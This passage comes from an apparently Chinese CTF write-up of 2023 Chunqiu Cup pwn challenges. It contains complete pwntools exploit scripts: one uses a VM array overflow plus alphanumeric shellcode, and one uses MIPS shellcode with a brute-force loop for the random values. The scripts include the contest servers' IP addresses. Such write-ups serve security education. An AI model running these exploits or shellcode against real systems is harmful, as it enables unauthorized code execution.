class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    md5 = hashlib.md5()<br>    md5.update(<span class="hljs-built_in">str</span>.encode())<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">res</span>):<br>    s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzA&#x27;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> s:<br>                    src = a + b + c + d<br>                    <span class="hljs-keyword">if</span> md5(src) == res:<br>                        <span class="hljs-keyword">return</span> src<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))    <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game</span>(<span class="hljs-params">level, times</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;level : &#x27;</span>, <span class="hljs-built_in">str</span>(level))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(times):<br>        p.recvuntil(<span class="hljs-string">&#x27;MD5(&#x27;</span>)<br>        src = p.recv(<span class="hljs-number">4</span>).decode()<br>        p.recvuntil(<span class="hljs-string">&#x27;== &#x27;</span>)<br>        res = p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br>        t = exploit(res)<br>        p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>, t)<br><br>    p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到足够的钱后，调用<code>sub_401396</code>获取足够的执行次数，调用<code>sub_40124D</code>将数据写入mmap分配的空间，最后调用<code>sub_401072</code>执行vm指令。</p><p>其中，实现vm虚拟指令部分存在数组溢出。可以覆盖返回地址为mmap，从而执行可见字符shellcode。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711215735810.png" alt="image-20230711215735810"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;39.106.131.193&#x27;</span>, <span class="hljs-number">25256</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>command = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b execve</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    md5 = hashlib.md5()<br>    md5.update(<span class="hljs-built_in">str</span>.encode())<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">res</span>):<br>    s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzA&#x27;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> s:<br>                    src = a + b + c + d<br>                    <span class="hljs-keyword">if</span> md5(src) == res:<br>                        <span class="hljs-keyword">return</span> src<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))    <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game</span>(<span class="hljs-params">level, times</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;level : &#x27;</span>, <span class="hljs-built_in">str</span>(level))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(times):<br>        p.recvuntil(<span class="hljs-string">&#x27;MD5(&#x27;</span>)<br>        src = p.recv(<span class="hljs-number">4</span>).decode()<br>        p.recvuntil(<span class="hljs-string">&#x27;== &#x27;</span>)<br>        res = p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br>        t = exploit(res)<br>        p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>, t)<br><br>    p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">opcode</span>(<span class="hljs-params">a, b, c ,d</span>):<br>    <span class="hljs-keyword">return</span> a + <span class="hljs-built_in">chr</span>(b) + <span class="hljs-built_in">chr</span>(c) + <span class="hljs-built_in">chr</span>(d)<br><br>load = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;A&#x27;</span>, b, c ,d)<br>load_z = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;B&#x27;</span>, b, c, d)<br>add = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;E&#x27;</span>, b, c, d)<br>mul = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;J&#x27;</span>, b, c, d)<br>myor = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;H&#x27;</span>, b, c ,d)<br>write = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;C&#x27;</span>, b, c, d)<br>sub = <span class="hljs-keyword">lambda</span> b, c, d: opcode(<span class="hljs-string">&#x27;F&#x27;</span>, b, c, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">content</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;to purchase&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">expand</span>():<br>    menu(<span class="hljs-number">2</span>)<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;you need : &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0xf0</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use</span>():<br>    menu(<span class="hljs-number">2</span>)<br>    menu(<span class="hljs-number">3</span>)<br><br><br>bss = <span class="hljs-number">0x20000</span> + <span class="hljs-number">0x18</span><br><br>game(<span class="hljs-number">4</span>, <span class="hljs-number">30</span>)<br>expand()<br><br>shellcode = <span class="hljs-string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br><br>zero = <span class="hljs-number">0x30</span><br><br>payload = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># payload += load(0x37 + 0x10, zero, 0x37 + 0x40)</span><br><span class="hljs-comment"># payload += mul(0x37 + 0x10, 0x37 + 0x10, zero)</span><br>payload += load(<span class="hljs-number">0x37</span> + <span class="hljs-number">0x10</span>, zero, <span class="hljs-number">0x37</span> + <span class="hljs-number">0x18</span>)<br>payload += load(zero, zero, <span class="hljs-number">0x37</span> + <span class="hljs-number">0x22</span>)<br>payload += load(<span class="hljs-number">0x37</span> + <span class="hljs-number">0x12</span>, zero, <span class="hljs-number">0x37</span> + <span class="hljs-number">0x20</span>)<br>payload += sub(<span class="hljs-number">0x37</span> + <span class="hljs-number">0x12</span>, zero, <span class="hljs-number">0x37</span> + <span class="hljs-number">0x12</span>)<br>payload += write(<span class="hljs-number">0x6f</span>, zero, zero)<br>payload = payload.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;x&#x27;</span>)<br><br>payload += shellcode<br><br>buy(payload)<br><br>use()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711215949846.png" alt="image-20230711215949846"></p><h2 id="sigin-shellcode"><a href="#sigin-shellcode" class="headerlink" title="sigin_shellcode"></a>sigin_shellcode</h2><p>查看保护。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711220537281.png" alt="image-20230711220537281"></p><p>mips32架构下的pwn题。</p><p>伪随机数，下到100层获取足够的钱。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711220650959.png" alt="image-20230711220650959"></p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711220749396.png" alt="image-20230711220749396"></p><p>通过获得的钱购买战斗力。</p><p>最后战斗，战胜boss后，获取执行shellcode的机会。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711220926671.png" alt="image-20230711220926671"></p><p>shellcode要求是mips32架构下的可见字符，题目已经给了大部分shellcode，我们只需要使execve第2个与第3个参数为0即可，即使$a1, $a2为0。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221056501.png" alt="image-20230711221056501"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    <span class="hljs-comment"># p = process([&#x27;chroot&#x27;, &#x27;.&#x27;, &#x27;./qemu-mipsel-static&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;./pwn&#x27;])</span><br>    p = process([<span class="hljs-string">&#x27;chroot&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;./qemu-mipsel-static&#x27;</span>, <span class="hljs-string">&#x27;./pwn&#x27;</span>])<br><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;39.106.65.236&#x27;</span>, <span class="hljs-number">38832</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br>rand = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <br>        <span class="hljs-number">11</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">19</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <br>        <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">17</span>, <span class="hljs-number">25</span>, <span class="hljs-number">14</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">33</span>, <span class="hljs-number">4</span>, <br>        <span class="hljs-number">17</span>, <span class="hljs-number">32</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">29</span>, <span class="hljs-number">33</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">41</span>, <span class="hljs-number">44</span>, <span class="hljs-number">3</span>, <br>        <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">46</span>, <span class="hljs-number">29</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">47</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">53</span>, <span class="hljs-number">5</span>, <br>        <span class="hljs-number">43</span>, <span class="hljs-number">52</span>, <span class="hljs-number">29</span>, <span class="hljs-number">32</span>, <span class="hljs-number">61</span>, <span class="hljs-number">53</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">41</span>, <span class="hljs-number">60</span>, <br>        <span class="hljs-number">33</span>, <span class="hljs-number">26</span>, <span class="hljs-number">39</span>, <span class="hljs-number">1</span>, <span class="hljs-number">53</span>, <span class="hljs-number">52</span>, <span class="hljs-number">69</span>, <span class="hljs-number">29</span>, <span class="hljs-number">5</span>, <span class="hljs-number">74</span>, <br>        <span class="hljs-number">5</span>, <span class="hljs-number">29</span>, <span class="hljs-number">69</span>, <span class="hljs-number">44</span>, <span class="hljs-number">33</span>, <span class="hljs-number">36</span>, <span class="hljs-number">53</span>, <span class="hljs-number">84</span>, <span class="hljs-number">43</span>, <span class="hljs-number">14</span>, <br>        <span class="hljs-number">85</span>, <span class="hljs-number">81</span>, <span class="hljs-number">89</span>, <span class="hljs-number">18</span>, <span class="hljs-number">49</span>, <span class="hljs-number">92</span>, <span class="hljs-number">53</span>, <span class="hljs-number">24</span>, <span class="hljs-number">5</span>, <span class="hljs-number">93</span>, <br>        <span class="hljs-number">95</span>, <span class="hljs-number">8</span>]<br><br><span class="hljs-comment"># 29</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Go&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">payload</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, <span class="hljs-string">&#x27;29&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;Shellcode &gt;&#x27;</span>, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shop</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rand.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            menu(<span class="hljs-number">1</span>)<br>            p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, line.strip())<br><br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># p.recvuntil(b&#x27;Thief!&#x27;, timeout=0.2)</span><br>    temp = p.recvall(timeout=<span class="hljs-number">0.2</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Thief!&#x27;</span> <span class="hljs-keyword">in</span> temp:<br>        log.success(<span class="hljs-string">&quot;thief: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) - <span class="hljs-number">1</span>))<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rand.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) - <span class="hljs-number">1</span>))<br>            f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        exit(-<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment"># exploit()</span><br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> rand:<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(x))<br><br>shop(<span class="hljs-number">3</span>)<br>shop(<span class="hljs-number">2</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lw $a1, 56($sp)</span><br><span class="hljs-string">lw $a2, 56($sp)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(shellcode)<br><br>attack(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>至于随机数，笔者利用题目给的libc库总是失败。也没想到其他办法，笔者这里的思路是爆破。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">rm</span> rand.txt<br><span class="hljs-built_in">touch</span> rand.txt<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..100&#125;<br><span class="hljs-keyword">do</span><br><span class="hljs-keyword">for</span>((j=<span class="hljs-number">1</span>; j&lt;=<span class="hljs-variable">$i</span>; j++))<br><span class="hljs-keyword">do</span><br>sudo python wp.py <span class="hljs-variable">$j</span><br><span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">break</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>将每次爆破的值存储到文件中，最后读取文件即可获取rand值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rand.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            menu(<span class="hljs-number">1</span>)<br>            p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, line.strip())<br><br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;do you want?&#x27;</span>, sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># p.recvuntil(b&#x27;Thief!&#x27;, timeout=0.2)</span><br>    temp = p.recvall(timeout=<span class="hljs-number">0.2</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Thief!&#x27;</span> <span class="hljs-keyword">in</span> temp:<br>        log.success(<span class="hljs-string">&quot;thief: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) - <span class="hljs-number">1</span>))<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rand.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>]) - <span class="hljs-number">1</span>))<br>            f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        exit(-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>爆了大概10分钟左右吧，就把所有的随机数都爆出来了。</p><h2 id="babyaul"><a href="#babyaul" class="headerlink" title="babyaul"></a>babyaul</h2><p>c语言与lua脚本的结合。</p><p>查看保护</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221358610.png" alt="image-20230711221358610"></p><p>我们的程序一开始是无法运行的，题目修改了lua脚本的文件头，我们复原文件头即可。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221532951.png" alt="image-20230711221532951"></p><p>即把Aul修改为Lua。</p><p>我们使用unlua反编译bins，得到lua脚本。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221744679.png" alt="image-20230711221744679"></p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711221818483.png" alt="image-20230711221818483"></p><p>lua调用c语言pass对字符进行加密，通过后即为我们熟悉的菜单堆。</p><p>我们通过对babyaul进行逆向找到pass加密逻辑。</p><p>程序优先加载bins文件，这也就是我们一开始运行失败的主要原因。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222052515.png" 